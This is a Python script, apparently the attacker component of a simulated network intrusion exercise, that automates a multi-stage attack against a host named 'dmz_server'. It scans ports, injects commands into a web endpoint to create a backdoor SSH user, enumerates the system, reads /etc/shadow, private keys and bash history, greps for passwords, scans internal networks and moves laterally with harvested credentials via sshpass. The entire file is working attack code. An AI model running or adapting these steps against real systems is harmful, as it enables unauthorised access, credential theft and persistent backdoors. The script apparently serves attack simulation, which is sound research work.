import nmap
import requests
import paramiko
import time
import re
import io
import os
import json


def port_scan(target, max_retries=3):
    nm = nmap.PortScanner()
    # nm.scan(target, arguments='-p 1-1000')
    # return nm["scan"]['tcp']

    for attempt in range(max_retries):
        try:
            nm.scan(target, arguments='-p 1-1000,2222,8080')
            # Debug: Print the raw scan result
            print("Debug - Raw scan result:")
            print(json.dumps(nm._scan_result, indent=2))
            
            # Check if the scan was successful
            if nm.all_hosts():
                host = nm.all_hosts()[0]  # Get the first (and likely only) host
                if 'tcp' in nm[host]:
                    return nm[host]['tcp']
                else:
                    print(f"No TCP ports found for {host}")
                    return {}
            else:
                print("No hosts found in scan result")
                
        except Exception as e:
            print(f"Nmap scan failed. Error: {str(e)}. Retrying... Attempt {attempt + 1}/{max_retries}")
            time.sleep(2)
    
    raise Exception("Failed to scan target after multiple attempts")

def initial_exploit(target):
    url = f"http://{target}/vulnerable_endpoint"
    
    # Create a backdoor user for SSH access
    payload = {"command": "useradd -m attacker && echo 'attacker:attackerpass' | chpasswd"}
    response = requests.post(url, json=payload)
    print("Backdoor user creation attempt:", response.text)

    # Ensure SSH is running
    payload = {"command": "service ssh start"}
    requests.post(url, json=payload)

    return "attacker", "attackerpass"

def establish_ssh_session(target, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, username=username, password=password)
        print(f"SSH connection established to {target}")
        return ssh
    except Exception as e:
        print(f"Failed to establish SSH connection: {str(e)}")
        return None

def execute_ssh_command(ssh, command):
    stdin, stdout, stderr = ssh.exec_command(command)
    return stdout.read().decode()

def enumerate_system(ssh):
    commands = [
        "uname -a",
        "whoami",
        "id",
        "ifconfig || ip addr",
        "netstat -tuln || ss -tuln",
        "ps aux",
        "ip route || route -n"
    ]
    
    system_info = {}
    for cmd in commands:
        output = execute_ssh_command(ssh, cmd)
        system_info[cmd] = output
        print(f"{cmd}:\n{output}\n")
    
    return system_info

def find_internal_networks(ssh):
    network_info = execute_ssh_command(ssh, "ip route || route -n")
    internal_networks = re.findall(r'\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)(?:\.[0-9]{1,3}){2}\b', network_info)
    if internal_networks:
        print(f"Potential internal networks found: {internal_networks}")
    return internal_networks

def search_for_credentials(ssh):
    sensitive_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/home/*/.ssh/id_rsa", "/home/*/.bash_history",
        "/var/www/html/config.php", "/etc/apache2/sites-available/*"
    ]
    
    potential_creds = ""
    for file in sensitive_files:
        content = execute_ssh_command(ssh, f"cat {file} 2>/dev/null || echo 'File not found or not readable'")
        if 'File not found' not in content:
            print(f"Content of {file}:")
            print(content[:500] + '...' if len(content) > 500 else content)
            print()
        potential_creds += content + "\n"
    
    grep_result = execute_ssh_command(ssh, "grep -r -i 'password' /etc/ /var/www/ 2>/dev/null || echo 'No passwords found'")
    
    config_content = execute_ssh_command(ssh, "cat /etc/config_files/internal_access.conf")
    print("Content of internal_access.conf:")
    print(config_content)
    return config_content

def scan_internal_network(ssh, internal_network):
    output = execute_ssh_command(ssh, f"nmap -sn {internal_network}")
    print(f"Scan results for {internal_network}:")
    print(output)
    return output

def attempt_lateral_movement(ssh, internal_target, config_content):
    # Parse the config file content
    config = dict(line.split('=') for line in config_content.splitlines() if '=' in line)
    username = config.get('internal_user')
    password = config.get('internal_password')
    print(username, password)
    
    if not username or not password:
        print("Failed to extract credentials from config file")
        return False
    
    # Attempt to SSH to internal target
    ssh_command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{internal_target} 'whoami && hostname'"
    output = execute_ssh_command(ssh, ssh_command)
    
    if output:
        print(f"Successfully connected to {internal_target}")
        print(output)
        return True
    else:
        print(f"Failed to connect to {internal_target}")
        return False

def multi_stage_attack():
    dmz_target = "dmz_server"
    
    print("Stage 1: Port Scanning DMZ")
    open_ports = port_scan(dmz_target)
    print(f"Open ports on DMZ server: {open_ports}")
    
    print("\nStage 2: Initial Exploitation of DMZ Server")
    username, password = initial_exploit(dmz_target)
    
    print("\nStage 3: Establishing SSH Session with DMZ")
    ssh = establish_ssh_session(dmz_target, username, password)
    if not ssh:
        print("Attack failed: Unable to establish SSH session")
        return
    
    print("\nStage 4: System Enumeration")
    system_info = enumerate_system(ssh)
    
    print("\nStage 5: Discovering Internal Networks")
    internal_networks = find_internal_networks(ssh)
    if not internal_networks:
        print("No internal networks discovered. Attack cannot proceed.")
        ssh.close()
        return
    
    print("\nStage 6: Searching for Credentials")
    potential_creds = search_for_credentials(ssh)
    
    print("\nStage 7: Internal Network Scanning")
    for network in internal_networks:
        scan_internal_network(ssh, network)
    
    print("\nStage 8: Attempting Lateral Movement")
    # For simplicity, we'll try the first internal network found
    internal_target = internal_networks[0].split('/')[0]  # Remove subnet mask if present
    success = attempt_lateral_movement(ssh, internal_target, potential_creds)
    
    if success:
        print("Lateral movement successful. Foothold established on internal network.")
    else:
        print("Lateral movement failed. Further exploitation or enumeration may be required.")
    
    ssh.close()

if __name__ == "__main__":
    multi_stage_attack()

    simulation_id = os.environ.get('SIMULATION_ID', 'unknown')
    with open(f'/signals/attacker_done_{simulation_id}', 'w') as f:
        f.write('done')